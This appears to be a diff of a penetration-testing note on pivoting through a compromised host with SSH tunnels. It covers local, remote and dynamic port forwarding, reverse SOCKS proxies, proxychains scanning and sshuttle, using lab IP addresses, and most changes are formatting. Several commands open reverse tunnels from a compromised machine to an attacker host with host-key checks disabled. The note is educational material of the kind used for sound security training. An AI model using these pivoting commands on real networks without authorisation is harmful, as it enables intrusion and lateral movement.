@@ -10,7 +10,7 @@ No root access needed on compromised machine.
 
 #### run this command on your attacking machine:
 
-```text
+```
 ssh -N -L localhost:localport:targethost:targetport [username@middlehost]
 ```
 
@@ -19,65 +19,61 @@ ssh -N -L localhost:localport:targethost:targetport [username@middlehost]
 * target host / port : ip and port of the target machine inside the internal network that we want to access
 * middlehost : the compromised machine that is going to be used as a pivot  point.
 
-{% hint style="warning" %}
-**If you are targeting a specific protocol like SMB, all port numbers should be the same**.
-{% endhint %}
-
 #### example for smb port 445:
 
-```text
+```
 ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
 ```
 
 test the connection:
 
-```text
+```
 nmap  127.0.0.1 -p 445
 ```
 
 ## Remote Port Forwarding
 
-#### The reverse of local port forwarding. a port is opened on the compromised remote machine and the traffic sent to that port is forwarded to attackers local port \(ssh client\).
+#### The reverse of local port forwarding. a port is opened on the compromised remote machine and the traffic sent to that port is forwarded to attackers local port (ssh client).
 
 {% hint style="danger" %}
-**SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports \(above 1024\).**
+**SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024).**
 
 SSH configurations on the attacker machine must allow remote connection to the given user and you have to enter the user password so **don't use the root account on your machine if you don't trust the middle host.**
 
 **I will explain how to secure remote port forwarding connections in a bit.**
 {% endhint %}
 
-#### Run this command on the middle host \(compromised target\).
+#### Run this command on the middle host (compromised target).
 
-```text
+```
 ssh -N -R attackerhost:attackerport:middlehost:middleport [username@attackerhost]
 ```
 
 {% hint style="info" %}
-Port numbers don't have to be the same here. 
+Port numbers don't have to be the same here.&#x20;
 {% endhint %}
 
 example for MySQL service port 3306:
 
-```text
+```
 ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
 ```
 
 test from attacker machine:
 
-```text
+```
 nmap -sV 127.0.0.1 -p 2221
 ```
 
 ### Secure Remote Port Forwarding
 
-In situations when you dont trust the middle host \(compromised pivot machine\) its a huge risk to your security if you use the root account or enter the password in the ssh connection. also if you are running the command in a non-interactive shell you will run into a hurdle .
+In situations when you dont trust the middle host (compromised pivot machine) its a huge risk to your security if you use the root account or enter the password in the ssh connection. also if you are running the command in a non-interactive shell you will run into a hurdle .
 
 #### to avoid entering our password and having problems wtih non-interactive shells we can use a few ssh command options.
 
 #### first create a pair of ssh keys to use instead of plain-text password:
 
-```text
+```
 # on compromised middle host enter:
 
 mkdir keys
@@ -87,7 +83,7 @@ ssh-keygen
 
 #### now the new public key needs to be entered in our attacker host’s authorized\_keys file for the attacker user:
 
-```text
+```
 # on compromised middle host enter:
 cat id_rsa.pub
 
@@ -98,9 +94,9 @@ cat id_rsa.pub
 
 the final **`~/.ssh/authorized_keys`** file on attacker machine will be like this:
 
-![](../../.gitbook/assets/image%20%28265%29.png)
+![](<../../.gitbook/assets/image (265).png>)
 
-#### This entry allows the owner of the private key \(middle host\) to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.
+#### This entry allows the owner of the private key (middle host) to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.
 
 then we have to add some more ssh options:
 
@@ -114,7 +110,7 @@ then we have to add some more ssh options:
 
 #### the final ssh command:
 
-```text
+```
 ssh -f -N -R attackerhost:attackerport:middlehost:middleport -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i keys/id_rsa user@attackerhost
 ```
 
@@ -128,35 +124,35 @@ For this technique to work, we need proxychains or other proxy tools.
 
 the syntax is like this:
 
-```text
+```
 ssh -N -D <attackerhost>:<attackerport> <username>@<middle host>
 ```
 
-#### With the above syntax in mind, we can create a local SOCKS4 application proxy \( -N -D \) on our attacker machine on TCP port 8080 \( 127.0.0.1:8080 \), which will tunnel all incoming traffic to any host in the target network, through the compromised pivot machine, which we log into.
+#### With the above syntax in mind, we can create a local SOCKS4 application proxy ( -N -D ) on our attacker machine on TCP port 8080 ( 127.0.0.1:8080 ), which will tunnel all incoming traffic to any host in the target network, through the compromised pivot machine, which we log into.
 
 example:
 
-```text
+```
 sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
 ```
 
 #### Now we must somehow direct our reconnaissance and attack tools to use this proxy. We can run any network application through HTTP, SOCKS4, and SOCKS5 proxies with the help of ProxyChains.
 
-#### we simply edit the main configuration file  `/etc/proxychains.conf` and add our SOCKS4 proxy to it:
+#### we simply edit the main configuration file ` /etc/proxychains.conf` and add our SOCKS4 proxy to it:
 
-![](../../.gitbook/assets/image%20%28264%29.png)
+![](<../../.gitbook/assets/image (264).png>)
 
 {% hint style="warning" %}
 Make sure that there are no ther proxy IPs in proxychains config file and the specified port is the same as the port in the SSH command.
 {% endhint %}
 
 {% hint style="info" %}
-By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user’s $\(HOME\)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs. we can use the -f options with proxychains to specify the path to the configuration file we want to use.
+By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user’s $(HOME)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs. we can use the -f options with proxychains to specify the path to the configuration file we want to use.
 {% endhint %}
 
 #### To run our tools through our SOCKS4 proxy, we prepend each command with proxychains
 
-```text
+```
 proxychains nmap -sT -Pn -n 192.168.1.110  # must use -sT option
 ```
 
@@ -166,30 +162,30 @@ proxychains nmap -sT -Pn -n 192.168.1.110  # must use -sT option
 
 ## Reverse Dynamic Forwarding
 
-#### as of OpenSSH version 7.6 \(Released late 2017\) SSH clients may generate dynamic reverse tunnels accessible to the server they connect to. What’s really cool is that you don’t need to update your server to version 7.6 before this trick will work. As long as the client supports it, the client enforces it when it completes the connection.
+#### as of OpenSSH version 7.6 (Released late 2017) SSH clients may generate dynamic reverse tunnels accessible to the server they connect to. What’s really cool is that you don’t need to update your server to version 7.6 before this trick will work. As long as the client supports it, the client enforces it when it completes the connection.
 
-run this command on the compromised remote system \(this looks like the remote port forwarding but by not specifying a host after the port the ssh client will create a socks proxy on attackers system\):
+run this command on the compromised remote system (this looks like the remote port forwarding but by not specifying a host after the port the ssh client will create a socks proxy on attackers system):
 
-```text
+```
 ssh -f -N -R [attackers port] -o "UserKnownHostsFile=/dev/null" -o "StricktHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa   user@[attackers IP]
 ```
 
 you can check if the port is open on attackers system:
 
-```text
+```
 netstat -tupln
 # look for sshd with local address of 127.0.0.1:[attackers port]
 ```
 
 ​​now edit proxychains configs in /etc/proxychains.conf and add the port:
 
-```text
+```
 socks4 127.0.0.1 [attackers port]
 ```
 
 now a stable tunnel is established and we can use proxychains for enumeration and connection:
 
-```text
+```
 proxychains nmap -sT -Pn [target local IP]
 ```
 
@@ -199,7 +195,7 @@ SOCKS proxy needs full TCP connection, we cant use other scanning techniques, IC
 
 ## SSHuttle
 
-```text
+```
 # Transparent proxy over SSH
 
 # Forwarding traffic through the pivot
@@ -210,6 +206,4 @@ sshuttle -r user@pivoting_machine x.x.x.x/24
 # -x == exclude some network to not transmit over the tunnel
 sshuttle -vNr user@pivoting_machine -x x.x.x.x.x/24
 ```
-
-
 
